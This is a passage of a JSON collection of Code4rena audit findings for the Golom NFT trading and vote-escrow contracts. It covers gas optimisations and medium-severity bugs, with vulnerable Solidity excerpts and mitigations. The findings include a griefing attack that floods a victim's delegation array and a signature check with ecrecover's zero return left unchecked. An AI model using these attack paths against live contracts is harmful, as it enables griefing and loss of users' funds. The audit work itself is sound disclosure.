|70449|47432| 21 |\n\n| Deployments ||\n|-|:-:|\n| Contract | avg |\n| GolomTrader | 2029204 |\n\nAfter:<br>\n```solidity\n    struct Order {\n        address collection; // NFT contract address\n        uint256 tokenId; // order for which tokenId of the collection\n        address signer; // maker of order address\n        uint256 orderType; // 0 if selling nft for eth , 1 if offering weth for nft,2 if offering weth for collection with special criteria root\n        uint256 totalAmt; // price value of the trade // total amt maker is willing to give up per unit of amount\n        Payment exchange; // payment agreed by maker of the order to pay on succesful filling of trade this amt is subtracted from totalamt\n        Payment prePayment; // another payment , can be used for royalty, facilating trades\n        uint256 tokenAmt; // token amt useful if standard is 1155 if >1 means whole order can be filled tokenAmt times\n        uint256 refererrAmt; // amt to pay to the address that helps in filling your order\n        bytes32 root; // A merkle root derived from each valid tokenId — set to 0 to indicate a collection-level or tokenId-specific order.\n        address reservedAddress; // if not address(0) , only this address can fill the order\n        uint256 nonce; // nonce of order usefull for cancelling in bulk\n        uint256 deadline; // timestamp till order is valid epoch timestamp in secs\n        bool isERC721; // standard of the collection , if 721 then true , if 1155 then false\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n```\n| Methods ||||||\n|-|:-|:-:|-|:-|:-:|\n| Contract | Method | min | max | avg | #calls |\n| GolomTrader | fillAsk | 238153 |241948|241394| 7 |\n| GolomTrader | setDistributor| 46259 |70427|47410| 21 |\n\n| Deployments ||\n|-|:-:|\n| Contract | avg |\n| GolomTrader | 2013782 |\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-13-struct-order-can-be-more-tighly-packed",
      "tags": [],
      "finders": []
    },
    {
      "id": "8767",
      "title": "[G-12] `abi.encode()` is less efficient than `abi.encodePacked()`",
      "impact": "GAS",
      "content": "Consider changing it if possible.<br>\n*There are 4 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L102\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n102:  abi.encode(\t\n115:\tabi.encode(\t\t \n130:\tabi.encode(\n414:  bytes32 computedHash = keccak256(abi.encode(leaf));\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-12-abiencode-is-less-efficient-than-abiencodepacked",
      "tags": [],
      "finders": []
    },
    {
      "id": "8766",
      "title": "[G-11] Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "Instead of using the `&&` operator in a single require statement to check multiple conditions, I suggest using multiple require statements with 1 condition per require statement (saving 3 gas per `&`).<br>\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper.\n\n*There are 4 instances of this issue:*\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L239\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n239: require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L538\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n538: require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');\n894: require(attachments[_from] == 0 && !voted[_from], 'attached');\n1008: require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-11-splitting-require-statements-that-use--saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "8765",
      "title": "[G-10] Multiplication/division by 2 should use bit shifting",
      "impact": "GAS",
      "content": "`<x> * 2` is equivalent to `<x> << 1` and `<x> / 2` is the same as `<x> >> 1`. The `MUL` and `DIV` opcodes cost 5 gas, whereas `SHL` and `SHR` only cost 3 gas.\n\n*There are 3 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L150\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n150: uint256 center = upper - (upper - lower) / 2; // ceil, avoiding overflow\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L1049\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n1049: uint256 _mid = (_min + _max + 1) / 2;\n1120: uint256 _mid = (_min + _max + 1) / 2;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-10-multiplicationdivision-by-2-should-use-bit-shifting",
      "tags": [],
      "finders": []
    },
    {
      "id": "8764",
      "title": "[G-09] Default value initialization",
      "impact": "GAS",
      "content": "\n### Problem\nIf a variable is not set/initialized, it is assumed to have the default value (`0`, `false`, `0x0` etc depending on the data type).<br>\nExplicitly initializing it with its default value is an anti-pattern and wastes gas.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L45\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n45:  uint256 public epoch = 0;\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L50\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\nuint256 public MIN_VOTING_POWER_REQUIRED = 0;\n```\n\n### Proof of Concept\nIn case of `RewardDistributor`<br>\n`hardhat-gas-reporter` results<br>\nbefore fix:<br>\n| Deployments ||||\n|-|:-:|:-:|:-:|\n| Contract | min | max | avg |\n| GolomTrader | 2379507  | 2379543  |  2379537\t|\nafter fix:\n| Deployments ||||\n|-|:-:|:-:|:-:|\n| Contract | min | max | avg |\n| GolomTrader | 2377233  | 2377269  |  2377263\t|\n\n### Mitigation\nRemove explicit initialization for default values.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-09-default-value-initialization",
      "tags": [],
      "finders": []
    },
    {
      "id": "8763",
      "title": "[G-08] Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "If you choose to make suggested above `public` functions as `external`, to continue gas optimizaton we can use `calldata`  function arguments instead of `memory`.<br>\nWhen a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. Each iteration of this for-loop costs at least 60 gas (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Structs have the same overhead as an array of length one.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L98\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n98:  function addFee(address[2] memory addr, uint256 fee) public onlyTrader {\n\n141: function traderClaim(address addr, uint256[] memory epochs) public {\n\n155: function exchangeClaim(address addr, uint256[] memory epochs) public {\n\n172: function multiStakerClaim(uint256[] memory tokenids, uint256[] memory epochs) public {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-08-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "8762",
      "title": "[G-07] `public` functions to `external`",
      "impact": "GAS",
      "content": "External call cost is less expensive than of public functions.<br>\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents’ functions and change the visibility from `external` to `public`.<br>\nThe following functions could be set `external` to save gas and improve code quality:<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L98\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n98:  function addFee(address[2] memory addr, uint256 fee) public onlyTrader {\n\n141: function traderClaim(address addr, uint256[] memory epochs) public {\n\n155: function exchangeClaim(address addr, uint256[] memory epochs) public {\n\n172: function multiStakerClaim(uint256[] memory tokenids, uint256[] memory epochs) public {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L203\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n203: function fillAsk(\n204:        Order calldata o,\n205:        uint256 amount,\n206:        address referrer,\n207:        Payment calldata p,\n208:        address receiver\n209:    ) public payable nonReentrant {\n\n279: function fillBid(\n280:        Order calldata o,\n281:        uint256 amount,\n282:        address referrer,\n283:        Payment calldata p\n284:    ) public nonReentrant {\n\n312: function cancelOrder(Order calldata o) public nonReentrant {\n\n334: function fillCriteriaBid(\n335:        Order calldata o,\n336:        uint256 amount,\n337:        uint256 tokenId,\n338:        bytes32[] calldata proof,\n339:        address referrer,\n340:        Payment calldata p\n341:    ) public nonReentrant {\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-07-public-functions-to-external",
      "tags": [],
      "finders": []
    },
    {
      "id": "8761",
      "title": "[G-06] Amounts should be checked for `0` before calling a transfer",
      "impact": "GAS",
      "content": "Checking non-zero transfer values can avoid an expensive external call and save gas.<br>\nWhile this is done at some places, it's not consistently done in the solution.<br>\nI suggest adding a non-zero-value check here:<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L151\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n151: rewardToken.transfer(addr, reward);\n\n165: rewardToken.transfer(addr, reward);\n\n208:  rewardToken.transfer(tokenowner, reward);\n\n209:  weth.transfer(tokenowner, rewardEth);\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L238\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n238: ERC1155(o.collection).safeTransferFrom(o.signer, receiver, o.tokenId, amount, '');\n\n304: nftcontract.safeTransferFrom(msg.sender, o.signer, o.tokenId, amount, '');\n\n364: nftcontract.safeTransferFrom(msg.sender, o.signer, tokenId, amount, '');\n\n382: WETH.transferFrom(o.signer, address(this), o.totalAmt * amount);\n\n383: WETH.withdraw(o.totalAmt * amount);\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L1023\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n1023: assert(IERC20(token).transfer(msg.sender, value));\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-06-amounts-should-be-checked-for-0-before-calling-a-transfer",
      "tags": [],
      "finders": []
    },
    {
      "id": "8760",
      "title": "[G-05] The result of external function calls should be cached rather than re-calling the function",
      "impact": "GAS",
      "content": "There is no need to call another contract functions multiple times to get same value, returned value should be cached in a variable;\nThe instances below point to the second+ call of the function within a single function:<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L100\n```solidity\nFile:\tcontracts/rewards/RewardDistributor.sol\n100: if (rewardToken.totalSupply() > 1000000000 * 10**18) {\n\n112:\t\tuint256 tokenToEmit = (dailyEmission * (rewardToken.totalSupply() - rewardToken.balanceOf(address(ve)))) /\n113:\t\t\trewardToken.totalSupply();\n114:\t\tuint256 stakerReward = (tokenToEmit * rewardToken.balanceOf(address(ve))) / rewardToken.totalSupply();\n\n239:      (rewardStaker[index] * ve.balanceOfAtNFT(tokenid, epochBeginTime[index])) /\n240:      ve.totalSupplyAt(epochBeginTime[index]);\n\n244:       ve.balanceOfAtNFT(tokenid, epochBeginTime[index])) /\n245:     ve.totalSupplyAt(epochBeginTime[index]);\n```\n`rewardToken.totalSupply()` should be cached.\n`ve.balanceOfAtNFT(tokenid, epochBeginTime[index]))` should be cached.\n`ve.totalSupplyAt(epochBeginTime[index])` should be cached.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-05-the-result-of-external-function-calls-should-be-cached-rather-than-re-calling-the-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "8759",
      "title": "[G-04] Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it",
      "impact": "GAS",
      "content": "To help the optimizer, declare a `storage` type variable and use it instead of repeatedly fetching the reference in a map or an array.\nThe effect can be quite significant.<br>\nAs an example, instead of repeatedly calling `someMap[someIndex]`, save its reference like this: `SomeStruct storage someStruct = someMap[someIndex]` and use it.<br>\n*Instances include:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L138\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n138:        if (checkpoints[nftId][nCheckpoints - 1].fromBlock <= blockNumber) {\n139:            return checkpoints[nftId][nCheckpoints - 1].delegatedTokenIds;\n```\n\nDeclare `storage` variable and use it:\n```solidity\nCheckpoint storage checkpoint = checkpoints[nftId][nCheckpoints - 1];\nif (checkpoint.fromBlock <= blockNumber) {\n    return checkpoint.delegatedTokenIds;\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-04-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it",
      "tags": [],
      "finders": []
    },
    {
      "id": "8758",
      "title": "[G-03] Cheaper input valdiations should come before expensive operations",
      "impact": "GAS",
      "content": "Check @audit comment for details<br>\n*There are 3 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L925\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n925:        LockedBalance memory _locked = locked[_tokenId];\n926:\t\t\t\t\t//@audit this check should be before we read from storage\n927:        require(_value > 0); // dev: need non-zero value\n\n942:        uint256 unlock_time = ((block.timestamp + _lock_duration) / WEEK) * WEEK; // Locktime is rounded down to weeks\n943:\t\t\t\t\t//@audit this check should be before we do unlock_time evalutaion\n944:        require(_value > 0); // dev: need non-zero value\n\n977:        assert(_isApprovedOrOwner(msg.sender, _tokenId));\n978:\n979:        LockedBalance memory _locked = locked[_tokenId];\n980:\t\t\t\t\t//@audit this check should be first, before line 977 check\n981:        assert(_value > 0); // dev: need non-zero value\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-03-cheaper-input-valdiations-should-come-before-expensive-operations",
      "tags": [],
      "finders": []
    },
    {
      "id": "8757",
      "title": "[G-02] Access mappings directly rather than using accessor functions",
      "impact": "GAS",
      "content": "Saves having to do two `JUMP` instructions, along with stack setup<br>\n*There are 6 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L72\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n72:\t\trequire(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');\n\n211:  require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowCore.sol#L1229\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowCore.sol\n1229:\taddress owner = ownerOf(_tokenId);\n\n406:\treturn _balance(_owner);\n\n453:\tuint256 current_count = _balance(_to);\n\n464:\tuint256 current_count = _balance(_from) - 1;\n```\n### Mitigation\nIstead of `ownerOf(tokenId)` use `idToOwner[tokenId]`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-02-access-mappings-directly-rather-than-using-accessor-functions",
      "tags": [],
      "finders": []
    },
    {
      "id": "8756",
      "title": "[G-01] ++variable costs less gas than variable++, especially when it’s used in for-loops (--variable/variable-- too)",
      "impact": "GAS",
      "content": "Prefix increments are cheaper than postfix increments.<br>\nSaves 6 gas *PER LOOP*<br>\n*There are 12 instances of this issue:*<br>\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L143\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n143:\tfor (uint256 index = 0; index < epochs.length; index++) {\n\n157:\tfor (uint256 index = 0; index < epochs.length; index++) {\n\n180:\tfor (uint256 tindex = 0; tindex < tokenids.length; tindex++) {\n\n183:\tfor (uint256 index = 0; index < epochs.length; index++) {\n\n226:\tfor (uint256 index = 0; index < epoch; index++) {\n\n258:\tfor (uint256 index = 0; index < epoch; index++) {\n\n273:\tfor (uint256 index = 0; index < epoch; index++) {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L415\n```solidity\nFile:\tcontracts/core/GolomTrader.sol \n415:\tfor (uint256 i = 0; i < proof.length; i++) {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L171\n```solidity\nFile:\tcontracts/vote-escrow/VoteEscrowDelegation.sol\n171:\tfor (uint256 index = 0; index < delegated.length; index++) {\n\n189:\tfor (uint256 index = 0; index < delegatednft.length; index++) {\n\n199:\tfor (uint256 i; i < _array.length; i++) {\n```\n\nhttps://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/TokenUriHelper.sol#L138\n```solidity\nFile:\tcontracts/vote-escrow/TokenUriHelper.sol\n138:\tdigits++;\n```\n\n### Mitigation\nChange `i++` to `++i`\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "#g-01-variable-costs-less-gas-than-variable-especially-when-its-used-in-for-loops---variablevariable---too",
      "tags": [],
      "finders": []
    },
    {
      "id": "8755",
      "title": "[M-18] `fillAsk()` Allows for `msg.value` to be larger than require locking the excess in the contract",
      "impact": "MEDIUM",
      "content": "\n[GolomTrader.sol#L217](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L217)<br>\n\nIt is possible to send a higher `msg.value` than is required to `fillAsk()`. The excess value that is sent will be permanently locked in the contract.\n\n### Proof of Concept\n\nThere is only one check over `msg.value` and it is that it's greater than `o.totalAmt * amount + p.paymentAmt`. As seen in the following code snippet from #217.\n\n```solidity\n        require(msg.value >= o.totalAmt * amount + p.paymentAmt, 'mgmtm');\n```\n\nThe issue here is that the contract will only ever spend exactly `o.totalAmt * amount + p.paymentAmt`. Hence if `msg.value` is greater than this then the excess value will be permanently locked in the contract.\n\n### Recommended Mitigation Steps\n\nTo avoid this issue consider enforcing a strict equality.\n\n```solidity\n        require(msg.value == o.totalAmt * amount + p.paymentAmt, 'mgmtm');\n```\n\n**[0xsaruman (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/75)**\n\n**[0xsaruman (Golom) disagreed with severity and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/75#issuecomment-1236313317):**\n > Resolved: https://github.com/golom-protocol/contracts/commit/366c0455547041003c28f21b9afba48dc33dc5c7#diff-63895480b947c0761eff64ee21deb26847f597ebee3c024fb5aa3124ff78f6ccR217\n> \n> Disagree with severity cause it's user choice to send more.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/75#issuecomment-1276385424):**\n > I agree with this being a medium. It opens up the potential for griefing attacks and all sorts of other issues that may be beyond the scope of \"the user decided to send excess funds\". Further, it's common for contracts to return excess funds, so the user may reasonably expect this behaviour.\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the GolomTrader.sol contract, which is part of the 2022-07-golom GitHub repository. This bug could allow someone to send a higher `msg.value` than is required to `fillAsk()`. The excess value that is sent will be permanently locked in the contract, meaning the funds are not retrievable. To mitigate this issue, the code should be updated to enforce a strict equality for the `msg.value` parameter, instead of just a greater-than comparison. This would ensure that the exact amount required is sent, and no excess funds are locked in the contract.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/75",
      "tags": [],
      "finders": [
        "codexploder",
        "scaraven",
        "cryptonue",
        "GiveMeTestEther",
        "rbserver",
        "arcoun",
        "minhquanym",
        "joestakey",
        "Twpony",
        "Lambda",
        "peritoflores",
        "Green",
        "reassor",
        "jayphbee",
        "cccz",
        "rotcivegaf",
        "Ruhum",
        "0xSky",
        "Treasure-Seeker",
        "horsefacts",
        "ych18",
        "RustyRabbit",
        "CertoraInc",
        "bin2chen",
        "AuditsAreUS",
        "dipp",
        "obront",
        "GimelSec"
      ]
    },
    {
      "id": "8754",
      "title": "[M-17] NFTs that don't have a checkpoint can't be transferred",
      "impact": "MEDIUM",
      "content": "\nSubmitting as high risk because it breaks a fundamental operation (transferring) for a large number of tokens.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/vote-escrow/VoteEscrowDelegation.sol#L212-L213>\n\n        uint256 nCheckpoints = numCheckpoints[tokenId];\n        Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1];\n\nL242 of `transferFrom()` calls `removeDelegation()` with the tokenId of the token being transferred. For tokens that don't have any checkpoints, L212 will return 0. This was cause an underflow error and revert in L213.\n\n### Recommended Mitigation Steps\n\nMake removeDelegation simply return if `nCheckpoints = 0`.\n\n**[kenzo (warden) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/191#issuecomment-1202226637):**\n > Unsure if high risk, but warden correctly identified the issue (that some others didn't) that the underflow in `removeDelegation` will prevent tokens from being transferred.\n\n**[zeroexdead (Golom) disagreed with severity](https://github.com/code-423n4/2022-07-golom-findings/issues/191)**\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/191#issuecomment-1276259331):**\n > Marking this as a medium risk because it only temporarily breaks functionality. The workaround would be to delegate the token and then transfer it, making the impact aggravating but ultimately minimal.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the transferFrom() function of the VoteEscrowDelegation.sol contract. It impacts the transfer of NFTs (Non-Fungible Tokens) that don't have a checkpoint, as they can't be transferred. A proof of concept is provided, showing that the transferFrom() function calls removeDelegation() with the tokenId of the token being transferred. If the token doesn't have any checkpoints, an underflow error will occur and the transfer will be reverted. The recommended mitigation step is to make removeDelegation simply return if nCheckpoints = 0.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/191",
      "tags": [],
      "finders": [
        "0x52",
        "0xsanson"
      ]
    },
    {
      "id": "8753",
      "title": "[M-16] `GolomTrader`: `validateOrder` function does not check if ecrecover return value is 0",
      "impact": "MEDIUM",
      "content": "\nThe validateOrder function of GolomTrader calls the Solidity ecrecover function directly to verify the given signatures.\nThe return value of ecrecover may be 0, which means the signature is invalid, but the check can be bypassed when signer is 0.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L176-L177>\n\n### Recommended Mitigation Steps\n\nUse the recover function from OpenZeppelin's ECDSA library for signature verification.\n\n**[kenzo (warden) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/357#issuecomment-1205955355):**\n > Seems invalid or QA at best. No impact on protocol as far as I see, invalid orders from \"address 0\" will revert.<br>\n> In fillAsk if the `o.signer` is address 0, the function will try to pull tokens from address 0 and will fail.<br>\n> In fillBid/criteria, function will try to transfer msg.sender's tokens to address 0 and pull weth from address 0. So will fail.<br>\n\n**[0xsaruman (Golom) disputed](https://github.com/code-423n4/2022-07-golom-findings/issues/357)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/357#issuecomment-1277605944):**\n > This is valid as a medium risk. It opens a griefing attack where a bad actor spams any system that relies on this function. The fact that the fill will fail while the order appears valid is specifically what makes this griefing attack possible.\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the GolomTrader contract’s validateOrder function, which calls the Solidity ecrecover function directly to verify the given signatures. The return value of ecrecover may be 0, indicating an invalid signature, but the check can be bypassed when signer is 0. This bug could have a serious impact, as it could allow someone to bypass the signature verification process.\n\nTo fix this issue, it is recommended to use the recover function from OpenZeppelin’s ECDSA library for signature verification. This library provides a secure and reliable way to verify signatures, and should be used instead of the ecrecover function. By using this library, the bug can be fixed, and the signature verification process can be made secure.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/357",
      "tags": [],
      "finders": [
        "cccz",
        "joestakey",
        "0xHarry",
        "teddav",
        "AuditsAreUS",
        "jayjonah8",
        "djxploit",
        "0x1f8b"
      ]
    },
    {
      "id": "8752",
      "title": "[M-15] Griefer can minimize delegatee's voting power",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L99><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L71-L89><br>\n\nSimilar to a previous submission, there are no checks preventing against delegating the same lock NFT multiple times. This opens an avenue to an expensive but potentially profitable griefing attack where the malicious user fills the victim's delegated token array with minimum voting power. The attacker can ensure that a delegatee has 0 voting power.\n\n### Proof of Concept\n\nTaking a look at the `delegate()` function below, there are no checks that a lock NFT has not already been delegated. Therefore, an attacker can delegate their token with minimum voting power (threshold initialized with value 0) to the victim.\n\n        function delegate(uint256 tokenId, uint256 toTokenId) external {\n            require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');\n            require(this.balanceOfNFT(tokenId) >= MIN_VOTING_POWER_REQUIRED, 'VEDelegation: Need more voting power');\n\n\n            delegates[tokenId] = toTokenId;\n            uint256 nCheckpoints = numCheckpoints[toTokenId];\n\n\n            if (nCheckpoints > 0) {\n                Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];\n                checkpoint.delegatedTokenIds.push(tokenId);\n                _writeCheckpoint(toTokenId, nCheckpoints, checkpoint.delegatedTokenIds);\n            } else {\n                uint256[] memory array = new uint256[](1);\n                array[0] = tokenId;\n                _writeCheckpoint(toTokenId, nCheckpoints, array);\n            }\n\n\n            emit DelegateChanged(tokenId, toTokenId, msg.sender);\n        }\n\nThere is a limit of 500 delegated tokens per delegatee. Therefore, the attacker can ensure minimum voting power if they delegate a worthless token 500 times to the victim:\n\n        function _writeCheckpoint(\n            uint256 toTokenId,\n            uint256 nCheckpoints,\n            